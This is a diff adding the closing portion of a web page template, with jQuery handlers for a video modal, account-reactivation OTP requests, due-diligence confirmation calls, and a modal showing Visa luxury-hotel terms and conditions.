+  $(document).ready(function () {
+    $("#play-video5").on("click", function () {
+      $("#video5")[0].src = "https://www.youtube.com/embed/Hw2o2PQWAt8?rel=0&amp;playlist=Hw2o2PQWAt8&amp;loop=1&amp;autoplay=1&amp;mute=0&autoplay=1";
+    });
+    $("#shide5").click(function () {
+      $(".video-modalsec5").hide();
+      $("#video5")[0].src = "";
+    });
+  });
+  function videoshow5() {
+    $(".video-modalsec5").show();
+  }
+</script>
+<script>
+
+  var btn = $('.back-to-top')
+
+  $(window).scroll(function () {
+    if ($(window).scrollTop() > 300) {
+      btn.addClass('show');
+    } else {
+      btn.removeClass('show');
+    }
+  });
+
+  btn.on('click', function (e) {
+    e.preventDefault();
+    $('html, body').animate({ scrollTop: 0 }, '300');
+  });
+</script>
+<script>
+  //   ""
+
+
+  $('#inactive_send_otp_btn').on('click', function (e) {
+    e.preventDefault();
+    $('#inactive_sendotp_error').html('');
+    $('#inactive_send_otp_btn').attr('disabled', true);
+    var token = 'bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS';
+    $.ajax({
+      url: "/ajax/inactive_sendotp_ajax/",
+
+      method: 'POST',
+      headers: { "X-CSRFToken": token },
+      success: function (data) {
+        $('#inactive_send_otp_btn').attr('disabled', false);
+        if (data.status_code == 'S') {
+          $('#applicationpopup').modal('hide');
+          $('#inactive_otp_verify').modal('show')
+        }
+        else {
+          $('#inactive_sendotp_error').html('Error: ' + data.status_desc)
+        }
+      }
+    });
+
+  })
+
+
+  $('#Verifyinactiveotpbtn').on('click', function (e) {
+    $('#inactive_readotp_error').html('');
+    $('#inactive_readotp_msg').html('');
+    e.preventDefault();
+    if ($('#inactive_otp').val() == '' || $('#inactive_otp').val().length != 6) {
+      $('#inactive_readotp_error').html('Error: Enter Valid OTP');
+    }
+    else {
+      $('#Verifyinactiveotpbtn').attr('disabled', true);
+      var token = 'bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS';
+      $.ajax({
+        url: "/ajax/inactive_verifyotp_ajax/",
+
+        method: 'POST',
+        headers: { "X-CSRFToken": token },
+        data: { 'inactive_otp': $('#inactive_otp').val() },
+        success: function (data) {
+
+          if (data.status_code == 'S') {
+            sessionStorage.setItem('show_login_popup', 'true');
+            $('#inactive_readotp_msg').html(data.status_desc).delay(7000).queue(function (nxt) {
+              window.location.href = "/logout/";
+              nxt();
+            });
+
+          }
+          else {
+            $('#Verifyinactiveotpbtn').attr('disabled', false);
+            $('#inactive_readotp_error').html('Error: ' + data.status_desc)
+          }
+        }
+      });
+    }
+
+
+  })
+</script>
+
+<script>
+
+
+  $('#submitDueDiligenceYes').click(function (e) {
+    $(this).attr('disabled', true)
+    $('#dueDiligenceNo').attr('disabled', true)
+    $('#error_message_dd_yes').text('')
+    $('#success_message_dd_yes').text('')
+    var token = 'bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS';
+    $.ajax({
+      url: "/ajax/confirm_due_diligence",
+      headers: { "X-CSRFToken": token },
+      method: 'POST',
+      data: { isCompleted: 'yes' },
+      success: function (data) {
+        if (data.status == 'S') {
+          $('#success_message_dd_yes').text(data.desc)
+          setTimeout(() => {
+            $("#verifykyc").modal('hide');
+            $(this).attr('disabled', false)
+            $('#dueDiligenceNo').attr('disabled', false)
+          }, 3000);
+        } else {
+          $('#error_message_dd_yes').text(data.desc)
+          $(this).attr('disabled', false)
+          $('#dueDiligenceNo').attr('disabled', false)
+        }
+      }
+    });
+  })
+
+  $('#submitDueDiligenceNo').click(function (e) {
+    $(this).attr('disabled', true)
+    $('#dueDiligenceCancel').attr('disabled', true)
+    $('#error_message_dd_no').text('')
+    var token = 'bBmXmIeOGjGBqbnbbiweQ21HXwPF9MoBDA8X3LXl5Lud1P2Sljo2ugTG6WVB05QS';
+    $.ajax({
+      url: "/ajax/confirm_due_diligence",
+      headers: { "X-CSRFToken": token },
+      method: 'POST',
+      data: { isCompleted: 'no' },
+      success: function (data) {
+        if (data.status == 'S') {
+          $('#success_message_dd_no').text(data.desc)
+          setTimeout("loguserout();", 6000);
+          // setTimeout(() => {
+          //   // $("#verifykyc").modal('hide');
+          //   // $("#verifykycConfirm").modal('hide');
+          //   window.location.href = "/account/upgrade/";
+          // }, 3000);
+        } else {
+          $('#error_message_dd_no').text(data.desc)
+          $(this).attr('disabled', false)
+          $('#dueDiligenceCancel').attr('disabled', false)
+        }
+      }
+    });
+  })
+</script>
+
+  <!-- footer end here -->
+
+  <div class="overlay"></div>
+
+  <!--termscondition start here -->
+  <div class="modal fade" id="termscondition">
+    <div class="modal-dialog modal-dialog-scrollable modal-dialog-centered" role="document">
+      <div class="modal-content">
+        <div class="modal-header">
+          <h5 class="modal-title" id="luxuryModal">Merchant Terms and Conditions:</h5>
+          <button type="button" class="close" data-bs-dismiss="modal" aria-label="Close"> <span aria-hidden="true">×</span>
+          </button>
+        </div>
+        <div class="modal-body">
+          <h5 class="subhead greentxt">Travel Hotels &amp; Lodging:</h5>
+          <p>Enjoy unsurpassed value at over 900 intriguing and prestigious properties around the world for a range of
+            tastes and budgets — from boutique gems to celebrated hotels and resorts. This hand-selected portfolio,
+            which includes hotel brands like Mandarin Oriental, Park Hyatt, Aman Resorts and Six Senses Resorts, was
+            developed exclusively for selected Visa cardholders and is appraised regularly. Privileges: - Best available
+            rate guarantee. - Automatic room upgrade upon arrival, when available. - Free in-room Internet. -
+            Complimentary continental breakfast. - 3PM check-out, when available. - VIP Guest status. - US$25 food or
+            beverage voucher. To book, please booking online directly or call Visa Concierge. To explore the hotels and
+            book, visit www.visaluxuryhotels.com.</p>
+          <h5 class="subhead greentxt">Visa Terms and Conditions:</h5>
+          <p>General Conditions: Offer is valid from now until 31 December 2019. Offer is valid at participating
+            properties. Offer is valid for Visa Infinite &amp; Signature cardholders and Visa Platinum cardholders in
+            China, Australia &amp; New Zealand. Offer valid only when you pay with a valid and eligible Visa card. Best
+            Available Rate applicable. Not applicable on discounted rates or combined with other offer at time of
+            enquiry/booking. One daily breakfast per person during stay. Exclude all applicable taxes, services,
+            gratuities and charges, and must be a valid and eligible Visa card. Void where prohibited, taxed or
+            restricted by law. Reservations: Reservation is subject to availability at time of confirmation.
+            Miscellaneous: Visa and participating properties reserve the right to vary the terms and conditions of this
+            offer. For updated list of participating properties, please visit. www.visaluxuryhotels.com or call Visa
+            Concierge for details.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!--termscondition end here -->
+
+
+  <script type="text/javascript">
+    $(function () {
+      $("[data-rel='tooltip']").tooltip();
+    });
+  </script>
+</body>
+
+</html>
